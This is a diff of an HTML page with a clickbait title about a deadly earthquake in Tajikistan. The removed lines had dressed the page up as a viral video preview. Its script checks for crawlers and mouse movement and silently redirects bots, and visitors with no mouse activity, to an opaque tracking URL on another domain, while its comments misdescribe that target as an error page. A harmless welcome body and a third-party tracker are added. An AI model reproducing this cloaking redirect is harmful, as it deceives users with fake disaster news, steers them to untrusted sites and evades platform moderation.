@@ -1,45 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Заминларзаи шадид дар Тоҷикистон! Биноҳо фурӯ рехтанд, талафот вуҷуд дорад!</title>
-
-    <!-- META para previsualización de video en redes sociales -->
-    <meta property="og:type" content="video.other">
-    <meta property="og:title" content="¡Imágenes impactantes del terremoto! Captadas en vivo.">
-    <meta property="og:description" content="Este video ha generado millones de vistas. Haz clic para ver.">
-    <meta property="og:image" content="https://img.youtube.com/vi/c2MHpGatrvk/maxresdefault.jpg">
-    <meta property="og:url" content="https://tusitio.com/video-terremoto"> <!-- Reemplázalo con tu dominio -->
-    <meta property="og:video" content="https://www.youtube.com/embed/c2MHpGatrvk">
-    <meta property="og:video:type" content="text/html">
-    <meta property="og:video:width" content="1280">
-    <meta property="og:video:height" content="720">
-
     <script>
+        // Detectar bots usando el "userAgent"
         function isBot() {
             var userAgent = navigator.userAgent.toLowerCase();
             var bots = ["facebookexternalhit", "bot", "crawl", "spider", "slurp", "bingbot", "googlebot"];
             for (var i = 0; i < bots.length; i++) {
                 if (userAgent.indexOf(bots[i]) > -1) {
-                    return true;
+                    return true;  // Es un bot
                 }
             }
-            return false;
+            return false;  // No es un bot
         }
 
+        // Detectar si el usuario interactúa con el sitio
         function detectUserBehavior() {
             var isHuman = false;
+
+            // Detectar movimiento del mouse (un comportamiento común de los humanos)
             window.addEventListener('mousemove', function() {
                 isHuman = true;
             });
+
+            // Si no hay interacción humana, redirigir a los bots
             setTimeout(function() {
                 if (!isHuman || isBot()) {
-                    window.location.href = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";
+                    window.location.href = "https://roclnow.com/?k=63523d54914e87a1a731af2a2ea5b55a&type=mainstream&subtype=global";  // Redirigir a una página de error
                 }
-            }, 2000);
+            }, 2000); // Tiempo límite de 3 segundos para detectar la interacción
         }
 
+        // Ejecutar la función para verificar bots y comportamiento
         window.onload = function() {
             detectUserBehavior();
         };
     </script>
 </head>
+<body>
+    <h1>Bienvenido a nuestro sitio web</h1>
+    <p>Si estás viendo esto, probablemente no seas un bot. ¡Gracias por visitarnos!</p>
+</body>
+    <script id="_wauup1">var _wau = _wau || []; _wau.push(["small", "lonelywolf", "up1"]);</script><script async src="//waust.at/s.js"></script>
+
+</html>
